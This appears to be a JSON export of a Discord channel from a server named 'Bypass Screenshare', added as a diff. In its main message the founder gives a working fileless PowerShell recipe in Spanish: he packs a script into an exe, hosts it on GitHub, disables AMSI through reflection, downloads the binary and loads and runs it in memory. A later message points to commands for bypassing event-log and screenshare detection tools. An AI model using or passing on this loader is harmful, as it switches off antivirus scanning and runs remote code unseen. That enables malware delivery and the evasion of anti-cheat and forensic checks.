@@ -1,0 +1,119 @@
+{
+  "guild": {
+    "id": "1385680731212218449",
+    "name": "Bypass Screenshare",
+    "iconUrl": "https://cdn.discordapp.com/icons/1385680731212218449/3be219b22eb8a5390cc8b0c1c31cf0c6.png?size=512"
+  },
+  "channel": {
+    "id": "1445833713484173552",
+    "type": "GuildTextChat",
+    "categoryId": "1461571659453563052",
+    "category": "metodos avanzados",
+    "name": "»「\uD83D\uDD76️」fileless-ps1",
+    "topic": null
+  },
+  "dateRange": {
+    "after": null,
+    "before": null
+  },
+  "exportedAt": "2026-06-17T21:15:23.4084744-03:00",
+  "messages": [
+    {
+      "id": "1511571881839300619",
+      "type": "Default",
+      "timestamp": "2026-06-03T00:27:00.278-03:00",
+      "timestampEdited": "2026-06-03T00:31:22.379-03:00",
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "hola gente, update del mierdimetodo este que deja log en todos putos lados, les doy una version full baipai\n\n\nlo primero q van a hacer es agarrar su  ps1 y lo van a convertir en un exe utilizando este comando\n\ninstalan esto: Install-Module -Name ps2exe -Scope CurrentUser\n\ny despues usan: Invoke-PS2EXE \"script.ps1\" \"script.exe\" -noConsole\n\ndeben especificar cada ruta, les dejo un ejemplo  para que se entienda mejor:\n\nInvoke-PS2EXE \"c:\\users\\ccsgo\\downloads\\script.s1\" \"c:\\users\\ccsgo\\downloads\\script.exe\" -noConsole\n\n\nuna vez tengan su script exportada a .exe la van a ejecutar para comprobar que funcione y la van a subir a github, copian su enlace raw y solo reemplazen la URL por el siguiente comando:\n\n\n\n```[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\n$bytes = (New-Object Net.WebClient).DownloadData('URL_DE_SU_SCRIPT')\n\n$asm = [Reflection.Assembly]::Load($bytes)\n\n[System.Threading.Thread]::CurrentThread.SetApartmentState('STA')\n\nWrite-Host \"[+] Assembly cargado correctamente\" -ForegroundColor Cyan\n\ntry {\n    $entry = $asm.EntryPoint\n    if ($entry) {\n        # Forma correcta para Main(string[] args)\n        $entry.Invoke($null, @(, [string[]]@()))\n        Write-Host \"[+] Ejecutado correctamente\" -ForegroundColor Green\n    }\n} catch {\n    Write-Host \"[!] Error: $($_.Exception.Message)\" -ForegroundColor Red\n}\n\n# Mantener vivo\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.Application]::Run(```",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1511571896569827428",
+      "type": "Default",
+      "timestamp": "2026-06-03T00:27:03.79-03:00",
+      "timestampEdited": null,
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "de nada",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    },
+    {
+      "id": "1511572059178799114",
+      "type": "Default",
+      "timestamp": "2026-06-03T00:27:42.559-03:00",
+      "timestampEdited": null,
+      "callEndedTimestamp": null,
+      "isPinned": false,
+      "content": "bypasea la tool de diff con un scriptblocking, aca tienen los comandos #»「\uD83D\uDEAB」bypass-eventvwr",
+      "author": {
+        "id": "1126370663553302559",
+        "name": "ccsgo.",
+        "discriminator": "0000",
+        "nickname": "Ccsgo",
+        "color": "#797878",
+        "isBot": false,
+        "roles": [
+          {
+            "id": "1489281259908894920",
+            "name": "Founder",
+            "color": "#797878",
+            "position": 32
+          }
+        ],
+        "avatarUrl": "https://cdn.discordapp.com/avatars/1126370663553302559/e9db7f5ae485572a9b3e657635636b85.png?size=512"
+      },
+      "attachments": [],
+      "embeds": [],
+      "stickers": [],
+      "reactions": [],
+      "mentions": [],
+      "inlineEmojis": []
+    }
+  ],
+  "messageCount": 3
+}
